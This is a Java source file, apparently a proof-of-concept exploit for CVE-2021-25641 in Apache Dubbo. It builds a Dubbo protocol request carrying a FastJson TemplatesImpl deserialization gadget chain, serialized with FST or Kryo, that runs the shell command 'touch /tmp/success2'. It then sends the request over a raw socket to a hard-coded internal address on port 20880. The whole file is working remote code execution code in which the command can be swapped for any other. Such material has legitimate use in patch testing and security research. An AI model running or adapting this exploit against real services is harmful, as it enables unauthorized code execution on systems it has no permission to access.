package cve;

import com.alibaba.fastjson.JSONObject;
import com.sun.org.apache.xml.internal.serializer.utils.Utils;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.ObjectOutput;
import org.apache.dubbo.common.serialize.fst.FstObjectOutput;
import org.apache.dubbo.common.serialize.kryo.KryoObjectOutput;


import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.Random;

public class CVE_2021_25641 {

    public static String SerType = "FST";

    public static Object getGadgetsObj(String cmd) throws Exception{
        //Make TemplatesImpl
        Object templates = util.Utils.createTemplatesImpl(cmd);
        //Make FastJson Gadgets Chain
        JSONObject jo = new JSONObject();
        jo.put("oops",templates);
        return util.Utils.makeXStringToStringTrigger(jo);
    }

    public static void main(String[] args) throws Exception {

        ByteArrayOutputStream baos = new ByteArrayOutputStream();

        //Make header
        byte[] header = new byte[16];
        ObjectOutput objectOutput;
        // set magic number.
        Bytes.short2bytes((short) 0xdabb, header);
        // set request and serialization flag.

        switch (SerType) {
            case "FST":
                objectOutput = new FstObjectOutput(baos);
                header[2] = (byte) ((byte) 0x80 | (byte)9 | (byte) 0x40);
                break;
            case "Kyro":
            default:
                objectOutput = new KryoObjectOutput(baos);
                header[2] = (byte) ((byte) 0x80 | (byte)8 | (byte) 0x40);
                break;
        }
        // set request id.
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
        //Genaral ObjectOutput
        objectOutput.writeUTF("2.7.2");
        objectOutput.writeUTF("com.pacemrc.dubbo.api.DemoService");
        objectOutput.writeUTF("");
        objectOutput.writeUTF("sayHello");
        objectOutput.writeUTF("Ljava/lang/String;"); //*/

        objectOutput.writeObject(getGadgetsObj("touch /tmp/success2"));
        objectOutput.writeObject(null);
        objectOutput.flushBuffer();

        //Transform ObjectOutput to bytes payload
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        Bytes.int2bytes(baos.size(), header, 12);
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(baos.toByteArray());

        byte[] bytes = byteArrayOutputStream.toByteArray();

        //Send Payload
        Socket socket = new Socket("10.58.120.200", 20880);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(bytes);
        outputStream.flush();
        outputStream.close();
    }
}